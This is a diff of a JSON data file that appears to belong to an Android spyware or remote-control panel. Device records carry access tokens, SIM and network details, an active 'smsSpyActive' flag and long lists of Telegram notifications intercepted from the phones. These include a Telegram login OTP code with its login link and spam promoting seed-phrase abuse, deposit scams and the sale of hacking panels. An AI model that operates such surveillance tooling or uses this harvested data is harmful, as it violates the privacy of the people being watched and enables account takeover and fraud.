@@ -6313,14 +6313,14 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776764999070,
+    "lastSeen": 1776775288671,
     "commandQueue": [],
-    "online": false,
+    "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
     "deviceInfo": {
       "model": "OPPO CPH2641",
       "androidVersion": "Android 15",
-      "battery": 91,
+      "battery": 53,
       "network": "WiFi: RITA",
       "sim1": "TSEL-MELAYANISEPENUHHATI",
       "sim2": "Tidak ada"
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775284367,
+    "lastSeen": 1776775287358,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,118 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "HALO WARGA TELEGRAM GUE ( @StevenCrasher ) \nINGIN MEMPERKENALKAN SALAH SATU PT GUE YAITU ( @XCHINDO_HAN ) AND DIA SUDAH RESMI JADI PT VIPP GUA\nJIKA KALIAN INGIN TRX MURBUG, SC, APK, ATAU PANEL BISA KE DIA YAH, AND KALO DIA NGERIP BISA LAPOR GUA🦋\nJIKA ANDA MINAT JOIN PT VIPP, PV\n@StevenCrasher",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775288934
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "💎 HIGH DEPOSIT KAR K READY HO JAO DOSTON 🔋\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🏆 Minimum 10K To 20K Deposit 🏆 \n     🤑 Karna Agar Bada Profit 🤑\n               👉 Karna Hai 🔴\n(( Upar Me Predictions Check Karlo  ))\n\nJitna High Deposit Utna High Profit💵",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775288914
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
+        "content": "♻️ Restarting bot...",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775288896
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******07\n• Waktu: 21/04/2026, 19.39",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775288814
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ГРИНДЕР 💰",
+        "content": "🟢 Продолжаем абузить сидки\n\nПока одни думают, что тема уже отжила, другие спокойно продолжают делать круги и забирать профит. \n\nСхема не зависит от настроения, сезона или удачного дня. Есть мануал – есть результат ✅ Все остальное просто лишние мысли.\n\nПопробуй и убедись сам ➡️ https://telegra.ph/Zarabotok-na-pereprodazhe-Seed-fraz-Ot-1500-rublej-za-krug-03-09-5\n\n❓ Есть вопросы? Пиши сюда »ЛС«",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775288792
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
+        "content": "🎉 User Baru Masuk!\n\n👤 @ProfBilly\n🆔 8548162916\n⏰ 21/4/2026, 12.41.24",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775288778
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16734 pesan baru dari 115 obrolan",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775288627
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
+        "content": "♻️ Restarting bot...",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775287550
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "HALO WARGA TELEGRAM GUE ( @StevenCrasher ) \nINGIN MEMPERKENALKAN SALAH SATU PT GUE YAITU ( @XCHINDO_HAN ) AND DIA SUDAH RESMI JADI PT VIPP GUA\nJIKA KALIAN INGIN TRX MURBUG, SC, APK, ATAU PANEL BISA KE DIA YAH, AND KALO DIA NGERIP BISA LAPOR GUA🦋\nJIKA ANDA MINAT JOIN PT VIPP, PV\n@StevenCrasher",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775287529
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "💎 HIGH DEPOSIT KAR K READY HO JAO DOSTON 🔋\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🏆 Minimum 10K To 20K Deposit 🏆 \n     🤑 Karna Agar Bada Profit 🤑\n               👉 Karna Hai 🔴\n(( Upar Me Predictions Check Karlo  ))\n\nJitna High Deposit Utna High Profit💵",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775287506
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ГРИНДЕР 💰",
+        "content": "🟢 Продолжаем абузить сидки\n\nПока одни думают, что тема уже отжила, другие спокойно продолжают делать круги и забирать профит. \n\nСхема не зависит от настроения, сезона или удачного дня. Есть мануал – есть результат ✅ Все остальное просто лишние мысли.\n\nПопробуй и убедись сам ➡️ https://telegra.ph/Zarabotok-na-pereprodazhe-Seed-fraz-Ot-1500-rublej-za-krug-03-09-5\n\n❓ Есть вопросы? Пиши сюда »ЛС«",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775287389
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******07\n• Waktu: 21/04/2026, 19.39",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775287374
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16734 pesan baru dari 115 obrolan",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775287340
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
+        "content": "🎉 User Baru Masuk!\n\n👤 @ProfBilly\n🆔 8548162916\n⏰ 21/4/2026, 12.41.24",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775287317
+      },
       {
         "appName": "Telegram",
         "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
@@ -14290,118 +14402,6 @@
         "time": "21/04 18:56",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776772591945
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: TELEGRAM\n🌍 Country: Indonesia\n📞 Number: +62********331\n💰 Price: Rp 1.650\n🔢 Code: 23996\n━━━━━━━━━━━━━━━\n📨 Message:\nTelegram code: 23996\n\nYou can also tap on this link to log in:\nhttps://t.me/login/23996\n\noLeq9AcOZkT\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008706836\n🏷️ System ID: FSCL15095157\n⏰ 21 Apr 2026 • 18:52 WIB\n\n#OTP #TELEGRAM",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772484586
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB CPANEL BY PRABOWO: Mann (Open panel & Vps)",
-        "content": "Pv jangan di sni",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772484561
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Shopee\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******82\n• Waktu: 21/04/2026, 18.52",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772484541
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5821 pesan baru dari 48 obrolan",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772484412
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB CPANEL BY PRABOWO: Mann (Open panel & Vps)",
-        "content": "Out",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772476930
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: TELEGRAM\n🌍 Country: Indonesia\n📞 Number: +62********331\n💰 Price: Rp 1.650\n🔢 Code: 23996\n━━━━━━━━━━━━━━━\n📨 Message:\nTelegram code: 23996\n\nYou can also tap on this link to log in:\nhttps://t.me/login/23996\n\noLeq9AcOZkT\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008706836\n🏷️ System ID: FSCL15095157\n⏰ 21 Apr 2026 • 18:52 WIB\n\n#OTP #TELEGRAM",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772476809
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Shopee\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******82\n• Waktu: 21/04/2026, 18.52",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772476713
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5820 pesan baru dari 48 obrolan",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772476393
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: #K— Of̶ 𐌕 Cōu̶rsēe. 𐍉",
-        "content": "😉😉",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772453810
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: kii-chan",
-        "content": "p",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772450850
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: #K— Of̶ 𐌕 Cōu̶rsēe. 𐍉",
-        "content": "😉😉",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772449359
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: Rose",
-        "content": "JANGAN LUPA START DULU DI PRIVATE BOT NYET",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772444169
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: Rose",
-        "content": "User info:\nID: 7944582539\nFirst Name: ᴋᴅ • ᴊɪʟᴘᴀɴ𝟤𝟩 ⚡\nUsername: @jilpanz\nUser link: link",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772442624
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PUBLIC FREE PANEL: ᴋᴅ • ᴊɪʟᴘᴀɴ𝟤𝟩 ⚡",
-        "content": "/info",
-        "time": "21/04 18:54",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772441695
       }
     ],
     "galleryPhotos": [],
